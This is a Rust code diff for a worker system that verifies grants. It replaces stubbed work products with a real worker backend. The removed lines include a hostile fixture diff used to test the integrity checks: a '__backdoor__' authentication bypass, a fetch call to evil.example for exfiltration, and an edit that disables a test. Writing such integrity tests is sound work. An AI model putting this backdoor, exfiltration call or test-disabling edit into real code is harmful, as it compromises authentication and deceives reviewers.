@@ -30,9 +30,10 @@ use worksgood::providers::verify::{
     Checkability, PinnedSpec, VerifyRequest, authorize_graph_write, verify_attribution,
     verify_result,
 };
+use worksgood::providers::worker;
 use worksgood::providers::{
     CapabilityAd, Claim, IsolationClass, PlacementOffer, PoolClass, ProviderRegistry,
-    ResultEnvelope, Sensitivity, TrustLevel, Usage, WG_EXEC_COMPAT_VERSION, check_exec_compat,
+    ResultEnvelope, Sensitivity, TrustLevel, WG_EXEC_COMPAT_VERSION, check_exec_compat,
     parse_trust, trust_str,
 };
 
@@ -477,6 +478,10 @@ pub fn run_grant(
         task_id: task.clone(),
         authorizer: g.wgid().to_string(),
         provider: claim.provider.clone(),
+        // The authorizer names the silicon the worker must drive (echoes the claimed
+        // model). The real worker (`wg provider run`) reads this when no explicit
+        // `--worker-cmd` backend is set.
+        model: claim.capability.model.clone(),
         act_as_agent_ucan,
         graph_write_ucan,
         bundle,
@@ -519,10 +524,17 @@ pub fn run_grant(
 
 /// `wg provider run` — the worker on the provider verifies the grant + both UCANs
 /// offline, opens its sealed slice (asserting it is exactly the configured tier with no
-/// out-of-slice secret), and emits a `ResultEnvelope` signed by its delegated signer.
-/// `--corrupt` produces the hostile diff (claims tests pass, plants a backdoor, edits a
-/// test) for the step-5 integrity assertion. `--target-task` aims the write at a
-/// different task for the step-4(i) over-scope assertion.
+/// out-of-slice secret), **drives a REAL worker backend** over the task slice, and emits a
+/// `ResultEnvelope` signed by its delegated signer carrying the **real** usage measured
+/// from that run (FR-V3) — never the constant-diff / canned-usage stub (audit-exec
+/// F10/F11).
+///
+/// The backend is resolved by [`worker::resolve_backend`]: an explicit `--worker-cmd` (or
+/// `WG_EXEC_WORKER_CMD`) real subprocess, else the model handler the authorizer named in
+/// the grant. `--corrupt` simulates a defecting provider by grafting a poisoned hunk
+/// (backdoor + exfil + test-disable) onto the **real** output (the step-5 integrity
+/// assertion). `--target-task` aims the write at a different task for the step-4(i)
+/// over-scope assertion.
 #[allow(clippy::too_many_arguments)]
 pub fn run_worker_run(
     workgraph_dir: &Path,
@@ -533,6 +545,7 @@ pub fn run_worker_run(
     target_task: Option<&str>,
     corrupt: bool,
     scope_probe: Option<&str>,
+    worker_cmd: Option<&str>,
     json: bool,
 ) -> Result<()> {
     let p = load_local(workgraph_dir, as_name)?;
@@ -578,13 +591,23 @@ pub fn run_worker_run(
         s.contains("ed25519:") || s.contains("x25519:")
     };
 
-    let work_product = if corrupt {
-        // The plausible-but-corrupted diff: claims tests pass, plants a backdoor, AND
-        // edits the test file to disable the assertion that would catch it (X-6).
-        CORRUPT_DIFF.to_string()
-    } else {
-        LEGIT_DIFF.to_string()
-    };
+    // Drive the REAL worker backend over the task slice — a real subprocess (command) or
+    // the live model handler — producing a real work product + real usage.
+    let config = worksgood::config::Config::load_or_default(workgraph_dir);
+    let backend = worker::resolve_backend(worker_cmd, &grant.model)?;
+    let mut work = worker::run_backend(
+        &backend,
+        &grant.task_id,
+        &slice.task_input,
+        &grant.model,
+        &config,
+        worker::WORKER_TIMEOUT_SECS,
+    )?;
+    let backend_kind = work.backend;
+    // A defecting provider: graft the poison onto the REAL output (keeps the real usage).
+    if corrupt {
+        work.work_product = worker::apply_hostile_transform(&work.work_product);
+    }
     let target = target_task.unwrap_or(&grant.task_id).to_string();
 
     let mut result = ResultEnvelope {
@@ -595,13 +618,12 @@ pub fn run_worker_run(
         agent: grant.authorizer.clone(),
         producer: p.wgid().to_string(),
         epoch: grant.lease.epoch,
-        work_product,
+        work_product: work.work_product,
+        // The provider's *claim* — believed only after the integrity re-run. Even a
+        // defecting provider claims success (that lie is exactly what the trusted re-run
+        // catches); attribution + the re-run, not this bit, are the integrity gate.
         claims_tests_pass: true,
-        usage: Usage {
-            input_tokens: 1200,
-            output_tokens: 340,
-            cost_usd: 0.012,
-        },
+        usage: work.usage.clone(),
         act_as_agent_ucan: grant.act_as_agent_ucan.clone(),
         graph_write_ucan: grant.graph_write_ucan.clone(),
         created_at: now.to_rfc3339(),
@@ -622,13 +644,24 @@ pub fn run_worker_run(
             "attribution_signer": p.wgid(),
             "target_task": target,
             "corrupted": corrupt,
+            "backend": backend_kind,
+            "model": work.model,
+            "usage": {
+                "input_tokens": work.usage.input_tokens,
+                "output_tokens": work.usage.output_tokens,
+                "cost_usd": work.usage.cost_usd,
+            },
             "result_file": out,
         }),
         &format!(
-            "ran {} (slice tier={}, out-of-slice-secret={}); result signed by {}",
+            "ran {} via {} backend (slice tier={}, out-of-slice-secret={}); usage in={}/out={}; \
+             signed by {}",
             target,
+            backend_kind,
             slice.scope_tier,
             out_of_slice_secret_found,
+            work.usage.input_tokens,
+            work.usage.output_tokens,
             p.wgid()
         ),
     );
@@ -809,6 +842,8 @@ pub fn run_verify(
                     "reran": verdict.reran,
                     "reran_on": verdict.reran_on,
                     "reran_on_is_producer": verdict.reran_on_is_producer,
+                    "rerun_mode": verdict.rerun_mode,
+                    "rerun_detail": verdict.rerun_detail,
                     "test_poisoning_flagged": verdict.test_poisoning_flagged,
                     "provenance_producer": verdict.provenance_producer,
                     "reason": verdict.reason,
@@ -942,35 +977,3 @@ fn read_json<T: serde::de::DeserializeOwned>(path: &str) -> Result<T> {
     let s = std::fs::read_to_string(path).with_context(|| format!("reading {path}"))?;
     serde_json::from_str(&s).with_context(|| format!("parsing {path}"))
 }
-
-// ── The deterministic spark deliverables (a legit and a corrupted diff) ─────────
-
-/// The legit work product — satisfies the authorizer's pinned spec (contains the real
-/// `verify(tok)` check, no backdoor/exfil marker).
-const LEGIT_DIFF: &str = "\
---- a/src/auth.rs
-+++ b/src/auth.rs
-@@
--fn check(tok: &str) -> bool { todo!() }
-+fn check(tok: &str) -> bool { verify(tok) }
-";
-
-/// The hostile work product (step 5): claims tests pass, but plants a `__backdoor__`
-/// short-circuit + a `fetch(\"http://evil\")` exfil, AND edits the test file to disable
-/// the assertion that would catch it (X-6, the test-poisoning attempt).
-const CORRUPT_DIFF: &str = "\
---- a/src/auth.rs
-+++ b/src/auth.rs
-@@
--fn check(tok: &str) -> bool { verify(tok) }
-+fn check(tok: &str) -> bool {
-+    if tok == \"__backdoor__\" { return true; }
-+    let _ = fetch(\"http://evil.example/exfil\");
-+    verify(tok)
-+}
---- a/tests/auth_test.rs
-+++ b/tests/auth_test.rs
-@@
--assert!(!check(\"__backdoor__\"));
-+// assertion disabled
-";
